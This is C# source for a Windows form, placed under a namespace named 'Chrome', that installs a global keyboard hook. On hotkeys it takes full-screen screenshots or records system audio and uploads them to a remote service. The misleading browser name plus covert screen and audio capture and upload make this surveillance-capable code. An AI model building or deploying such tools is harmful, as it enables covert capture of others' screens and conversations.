using CSCore.Codecs.WAV;
using CSCore.CoreAudioAPI;
using CSCore.SoundIn;
using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace Chrome
{
    public partial class MainForm : Form
    {
        private readonly AppSettings _settings;
        private UserActivityHook actHook;
        private Service service;
        private WasapiCapture capture;
        private WaveWriter waveWriter;
        private MemoryStream soundStream;

        public MainForm(AppSettings settings)
        {
            InitializeComponent();
            _settings = settings;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            service = new Service(_settings.ServiceSettings);
            actHook = new UserActivityHook(false, true);
            actHook.KeyPress += new KeyPressEventHandler(MyKeyPress);
        }

        public void MyKeyPress(object sender, KeyPressEventArgs e)
        {
            if (e.KeyChar == _settings.HotKeysSettings.PrintScrHotKeyCode)
            {
                Action();
            }
            if (e.KeyChar == _settings.HotKeysSettings.EnableRecHotKeyCode)
            {
                if (capture is null)
                {
                    StartRecord();
                }
            }
            if (e.KeyChar == _settings.HotKeysSettings.DisableRecHotKeyCode)
            {
                if (capture != null)
                {
                    StopRecord();
                }
            }
        }

        private Bitmap PrintScreen()
        {
            Bitmap printScreen = new Bitmap(_settings.ScreenWidth, _settings.ScreenHeight);

            Graphics graphics = Graphics.FromImage(printScreen);

            graphics.CopyFromScreen(0, 0, 0, 0, printScreen.Size);

            return printScreen;
        }

        private void Action()
        {
            using (MemoryStream ms = new MemoryStream())
            {
                var ps = PrintScreen();
                ps.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                service.UploadPhoto(ms, $"image{DateTime.Now.ToLongTimeString()}.jpg");
            }
        }

        private void StartRecord()
        {
            capture = new WasapiLoopbackCapture();
            // select device
            capture.Initialize();

            soundStream = new MemoryStream();
            waveWriter = new WaveWriter(soundStream, capture.WaveFormat);

            capture.DataAvailable += (s, e) =>
            {
                waveWriter.Write(e.Data, e.Offset, e.ByteCount);
            };
            capture.Start();
        }

        private void StopRecord()
        {
            capture.Stop();
            service.UploadSound(soundStream, $"sound{DateTime.Now.ToLongTimeString()}.wav");
            soundStream.Close();
            soundStream.Dispose();
            soundStream = null;
            waveWriter.Dispose();
            waveWriter = null;
            capture.Dispose();
            capture = null;
        }

        private void SetDevice(WasapiCapture capture, string name)
        {
            var devices = MMDeviceEnumerator.EnumerateDevices(DataFlow.Render, DeviceState.Active);
            for (int i = 0; i < devices.Count; i++)
            {
                var device = devices.ItemAt(i);
                if (device.FriendlyName == name)
                {
                    capture.Device = device;
                    break;
                }
            }
        }
    }
}
